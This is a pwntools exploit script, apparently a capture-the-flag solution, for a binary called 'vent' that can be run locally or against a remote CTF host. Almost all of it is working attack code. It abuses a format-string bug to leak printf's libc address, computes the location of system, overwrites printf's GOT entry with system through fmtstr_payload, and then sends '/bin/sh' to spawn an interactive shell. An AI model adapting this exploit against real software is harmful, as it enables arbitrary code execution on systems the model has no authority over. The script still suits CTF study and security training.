#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="info"
import time
import os
import warnings
import logging
logging.getLogger().setLevel(logging.ERROR)
warnings.filterwarnings("ignore", category=BytesWarning)
gdb_script='''
'''

path="./vent"
if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
libc=elf.libc
HOST="vent.squ1rrel-ctf-codelab.kctf.cloud"
PORT= 1337
context.binary = elf
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
g 		= lambda sym,data			: log.info(f"\033[32m {sym} | {hex(data)}\033[32m")
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
# for i in range(1,100):
# 	p=process(path)
# 	sla("about?",f"%{i}$p")
# 	try:
# 		leak=int(ru("helped!").split()[2].decode(),16)
# 		g(f"{i} libc_leak",leak)
# 	except ValueError:
# 		pass
	# p.close()
pay=payload = b'%9$s    ' + pack(elf.got.printf)
sla("about?",pay)
leak=uu64(ru("helped!").split()[2])
g("libc_leak",leak)
libc.address=leak - 0x61c90
g("libc_base",libc.address)
system=libc.address+0x052290
payload=fmtstr_payload(8, {elf.got.printf : system}, write_size='short')
sla("about?",payload)
sla('? \n', b'/bin/sh\x00')
ia()
